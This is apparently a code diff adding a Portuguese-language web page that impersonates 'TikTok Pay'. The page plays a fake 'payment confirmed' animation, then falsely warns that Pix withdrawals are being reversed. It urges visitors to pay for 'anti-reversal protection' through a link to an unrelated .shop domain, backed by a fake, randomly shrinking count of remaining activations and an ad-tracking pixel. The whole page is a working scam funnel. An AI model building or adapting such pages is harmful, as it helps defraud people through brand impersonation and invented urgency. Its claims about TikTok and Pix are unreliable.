@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>
+  (function () {
+    const utms = window.location.search;
+    if (!utms) return;
+    document.querySelectorAll('a[href]').forEach(link => {
+      const href = link.getAttribute('href');
+      if (!href || href.startsWith('#') || href.startsWith('javascript') || href.startsWith('mailto:') || href.startsWith('tel:')) return;
+      if (href.includes('utm_')) return;
+      const separador = href.includes('?') ? '&' : '?';
+      link.setAttribute('href', href + separador + utms.slice(1));
+    });
+  })();
+</script>
+
+<script>
+(function() {
+  const utms = new URLSearchParams(window.location.search);
+  if (!utms.toString()) return;
+  document.addEventListener("DOMContentLoaded", () => {
+    document.querySelectorAll("a[href]").forEach(link => {
+      const url = new URL(link.href, window.location.origin);
+      if (!url.searchParams.has("utm_source")) {
+        utms.forEach((value, key) => url.searchParams.set(key, value));
+        link.href = url.toString();
+      }
+    });
+  });
+})();
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proteção TikTok Pay</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: #ffffff;
+            color: #000000;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* TELA DE VALIDAÇÃO */
+        .validation-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .validation-container {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #f0f0f0;
+            border-top: 3px solid #ff0050;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .checkmark {
+            width: 50px;
+            height: 50px;
+            background: #ff0050;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            opacity: 0;
+            transform: scale(0);
+        }
+
+        .checkmark i {
+            font-size: 24px;
+            color: white;
+        }
+
+        .validation-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+        }
+
+        /* PÁGINA PRINCIPAL */
+        .container {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            max-width: 100%;
+            display: none;
+        }
+
+        /* Header */
+        .header {
+            padding: 16px;
+            text-align: center;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .tiktok-logo {
+            height: 24px;
+        }
+
+        /* Conteúdo Principal */
+        .main-content {
+            flex: 1;
+            padding: 30px 20px 20px 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            text-align: center;
+        }
+
+        /* Ícone Principal */
+        .main-icon {
+            width: 70px;
+            height: 70px;
+            background: #ff0050;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 28px;
+        }
+
+        /* Títulos */
+        .title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #000;
+            line-height: 1.3;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        /* Alerta de Segurança */
+        .security-alert {
+            background: #fff5f8;
+            border-radius: 10px;
+            padding: 16px;
+            margin: 20px 0;
+            border: 1px solid #ff0050;
+            text-align: left;
+        }
+
+        .alert-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            color: #ff0050;
+            font-weight: 600;
+        }
+
+        .alert-icon {
+            width: 20px;
+            height: 20px;
+            background: #ff0050;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 10px;
+            flex-shrink: 0;
+        }
+
+        .alert-text {
+            font-size: 14px;
+            color: #000;
+            line-height: 1.4;
+        }
+
+        /* Benefícios */
+        .benefits {
+            margin: 20px 0;
+        }
+
+        .benefit {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .benefit-icon {
+            width: 20px;
+            height: 20px;
+            background: #ff0050;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 10px;
+            flex-shrink: 0;
+        }
+
+        .benefit-text {
+            font-size: 14px;
+            color: #000;
+            font-weight: 500;
+        }
+
+        /* Botão Principal */
+        .cta-button {
+            width: 100%;
+            background: #ff0050;
+            border: none;
+            border-radius: 12px;
+            padding: 18px;
+            font-size: 17px;
+            font-weight: 700;
+            color: white;
+            cursor: pointer;
+            margin: 25px 0 15px 0;
+            transition: transform 0.2s;
+            text-decoration: none;
+            display: block;
+        }
+
+        .cta-button:active {
+            transform: scale(0.98);
+        }
+
+        /* Urgência */
+        .urgency {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #fff5f8;
+            padding: 14px 16px;
+            border-radius: 10px;
+            border: 1px solid #ff0050;
+            font-size: 13px;
+            color: #ff0050;
+            font-weight: 600;
+        }
+
+        .urgency span {
+            color: #000;
+            font-weight: 800;
+        }
+
+        /* Footer */
+        .footer {
+            padding: 16px;
+            text-align: center;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .footer-text {
+            font-size: 11px;
+            color: #666;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- TELA DE VALIDAÇÃO -->
+    <div class="validation-screen" id="validationScreen">
+        <div class="validation-container">
+            <div class="loading-spinner" id="loadingSpinner"></div>
+            <div class="checkmark" id="checkmark">
+                <i class="fas fa-check"></i>
+            </div>
+            
+            <div class="validation-text" id="validationText">Processando pagamento...</div>
+        </div>
+    </div>
+
+    <!-- PÁGINA PRINCIPAL -->
+    <div class="container" id="mainScreen">
+        <!-- Header -->
+        <div class="header">
+            <img src="/unnamed copy copy.png" alt="TikTok" class="tiktok-logo">
+        </div>
+
+        <!-- Conteúdo Principal -->
+        <div class="main-content">
+            <div class="main-icon">
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            
+            <h1 class="title">Proteção Anti-Reversão Ativada</h1>
+            <div class="subtitle">Garanta que seu saque chegue com segurança na sua conta</div>
+
+            <!-- Alerta de Segurança -->
+            <div class="security-alert">
+                <div class="alert-header">
+                    <div class="alert-icon">
+                        <i class="fas fa-exclamation"></i>
+                    </div>
+                    <div>ATENÇÃO: Proteção Recomendada</div>
+                </div>
+                <div class="alert-text">
+                    Saques recentes foram revertidos por falha bancária e divergência de chave Pix. 
+                    Ative a proteção anti-reversão para garantir a entrega do valor.
+                </div>
+            </div>
+
+            <div class="benefits">
+                <div class="benefit">
+                    <div class="benefit-icon">
+                        <i class="fas fa-shield-check"></i>
+                    </div>
+                    <div class="benefit-text">Cobertura contra reversão automática do Pix</div>
+                </div>
+                <div class="benefit">
+                    <div class="benefit-icon">
+                        <i class="fas fa-key"></i>
+                    </div>
+                    <div class="benefit-text">Proteção contra erro de chave Pix</div>
+                </div>
+                <div class="benefit">
+                    <div class="benefit-icon">
+                        <i class="fas fa-university"></i>
+                    </div>
+                    <div class="benefit-text">Prevenção de falhas bancárias</div>
+                </div>
+            </div>
+
+            <a href="https://blackdotik11.shop/tik/uppp4/pay/" class="cta-button">
+                <i class="fas fa-lock"></i>
+                ATIVAR PROTEÇÃO ANTI-REVERSÃO
+            </a>
+
+            <div class="urgency">
+                <div>
+                    <i class="fas fa-users"></i>
+                    <span id="vacancies">8</span> ativações restantes
+                </div>
+                <div>
+                    <i class="fas fa-clock"></i>
+                    Oferta limitada
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-text">
+                TikTok Pay • Proteção válida para este saque<br>
+                Garanta a entrega segura do seu valor
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Animação de validação
+        document.addEventListener('DOMContentLoaded', function() {
+            const validationScreen = document.getElementById('validationScreen');
+            const mainScreen = document.getElementById('mainScreen');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const checkmark = document.getElementById('checkmark');
+            const validationText = document.getElementById('validationText');
+
+            setTimeout(() => {
+                validationText.textContent = 'Pagamento confirmado!';
+            }, 1500);
+
+            setTimeout(() => {
+                loadingSpinner.style.display = 'none';
+                checkmark.style.opacity = '1';
+                checkmark.style.transform = 'scale(1)';
+            }, 2500);
+
+            setTimeout(() => {
+                validationText.textContent = 'Redirecionando...';
+            }, 3500);
+
+            // Transição para página principal
+            setTimeout(() => {
+                validationScreen.style.display = 'none';
+                mainScreen.style.display = 'block';
+            }, 4500);
+        });
+
+        // Contador de ativações
+        let vacancies = 8;
+        const vacanciesDisplay = document.getElementById('vacancies');
+        
+        // Diminuir ativações aleatoriamente
+        setInterval(() => {
+            if (vacancies > 1 && Math.random() < 0.25) {
+                vacancies--;
+                vacanciesDisplay.textContent = vacancies;
+            }
+        }, 12000); // A cada 12 segundos
+    </script>
+</body>
+</html>
+
+<script>
+  window.pixelId = "68049b1979509ae9dee0ef56";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
